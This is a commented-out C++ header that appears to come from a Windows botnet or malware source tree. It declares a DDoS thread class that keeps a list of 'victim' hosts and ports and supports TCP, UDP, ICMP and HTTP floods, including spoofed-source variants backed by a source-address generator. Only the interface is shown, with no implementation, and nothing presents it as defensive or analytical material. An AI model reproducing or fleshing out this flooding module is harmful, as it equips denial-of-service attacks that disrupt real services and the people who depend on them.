/*#pragma once

#include <windows.h>
#include <ws2tcpip.h>
#include <vector>
#include "thread.h"
#include "mutex.h"
#include "socketwrapper.h"
#include "timeout.h"

#define DDOS_TCP 1
#define DDOS_UDP 2
#define DDOS_ICMP 4
#define DDOS_TCP_SPOOF 8
#define DDOS_UDP_SPOOF 16
#define DDOS_HTTP 32

struct DDoSVictim
{
	CHAR Host[256];
	DWORD Flags;
	DWORD Amount;
	DWORD Delay;
	Timeout Timeout;
	USHORT Port;
	Socket Socket;
	BOOL Connected;
};

class DDoS : public Thread
{
public:
	DDoS();
	VOID AddVictim(PCHAR Host, USHORT Port, DWORD Flags, DWORD Amount, DWORD Delay, DWORD Time);
	VOID ClearVictimList(VOID);

private:
	VOID ThreadFunc(VOID);
	VOID RemoveVictim(UINT Index);
	ULONG GenerateSourceAddress(VOID);

	BOOL Active;
	std::vector<DDoSVictim> VictimList;
	Mutex Mutex;
};*/